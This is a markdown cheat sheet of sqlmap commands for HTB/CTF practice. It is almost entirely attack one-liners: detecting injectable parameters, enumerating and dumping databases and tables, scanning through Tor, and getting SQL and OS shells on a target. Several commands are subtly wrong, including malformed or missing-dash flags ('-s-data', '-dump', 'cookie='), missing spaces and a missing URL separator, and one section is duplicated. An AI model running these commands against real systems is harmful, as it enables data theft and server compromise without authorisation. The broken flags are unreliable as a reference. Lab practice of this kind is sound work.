---
layout: memory
title: sqlmap Cheatsheet
---

Quick writeup and cheat sheet for [sqlmap](https://github.com/sqlmapproject/sqlmap) the automated SQLi and database takeover tool to speed up HTB/CTFs

- [Simple usage](#simple-usage)
- [Specify target DBMS to MySQL](#specify-target-dbms-to-mysql)
- [Using a proxy](#using-a-proxy)
- [Specify param1 to exploit](#specify-param1-to-exploit)
- [Use POST requests](#use-post-requests)
- [Access with authenticated session](#access-with-authenticated-session)
- [Basic authentication](#basic-authentication)
- [Specify parameter to exploit](#specify-parameter-to-exploit)
- [Specify parameter to exploit in 'nice' URIs](#specify-parameter-to-exploit-in-nice-uris)
- [Evaluating response strings](#evaluating-response-strings)
- [List databases](#list-databases)
- [List databases](#list-databases-1)
- [List tables of database target\_DB](#list-tables-of-database-target_db)
- [Dump table target\_Table of database target\_DB](#dump-table-target_table-of-database-target_db)
- [List columns of table target\_Table of database target\_DB](#list-columns-of-table-target_table-of-database-target_db)
- [Scan through TOR](#scan-through-tor)
- [Get SQL Shell](#get-sql-shell)
- [Get OS Shell](#get-os-shell)


<!-- cSpell:disable -->
### Simple usage
```bash
sqlmap -u "$URL"
```

### Specify target DBMS to MySQL
```bash
sqlmap -u "$URL" --dbms=mysql
```

### Using a proxy
```bash
sqlmap -u "$URL" --proxy=http://proxy_address:port
```

### Specify param1 to exploit
```bash
sqlmap -u "$URLparam1=value1&param2=value2" -p param1
```

### Use POST requests
```bash
sqlmap -u "http://target_server" --data=param1=value1&param2=value2
```

### Access with authenticated session
```bash
sqlmap -u "http://target_server" --data=param1=value1&param2=value2 -p param1 cookie='my_cookie_value'
```

### Basic authentication
```bash
sqlmap -u "http://target_server" -s-data=param1=value1&param2=value2 -p param1--auth-type=basic --auth-cred=username:password
```

### Specify parameter to exploit
```bash
sqlmap --dbms=mysql -u "http://www.example.com/param1=value1&param2=value2" --dbs -p param2
```

### Specify parameter to exploit in 'nice' URIs
```bash
sqlmap --dbms=mysql -u "http://www.example.com/param1/value1*/param2/value2" --dbs # exploits param1
```

### Evaluating response strings
```bash
sqlmap -u "$URL" --string="This string if query is TRUE"
sqlmap -u "$URL" --not-string="This string if query is FALSE"
```

### List databases
```bash
sqlmap -u "$URL" --dbs
```

### List databases
```bash
sqlmap -u "$URL" --dbs
```

### List tables of database target_DB
```bash
sqlmap -u "$URL" -D target_DB --tables
```

### Dump table target_Table of database target_DB
```bash
sqlmap -u "$URL" -D target_DB -T target_Table -dump
```

### List columns of table target_Table of database target_DB
```bash
sqlmap -u "$URL" -D target_DB -T target_Table --columns
```

### Scan through TOR
```bash
sqlmap -u "$URL" --tor --tor-type=SOCKS5
```

### Get SQL Shell
```bash
sqlmap -u "$URL" --sql-shell
```

### Get OS Shell
```bash
sqlmap -u "$URL" --os-shell
```
<!-- cSpell:enable -->
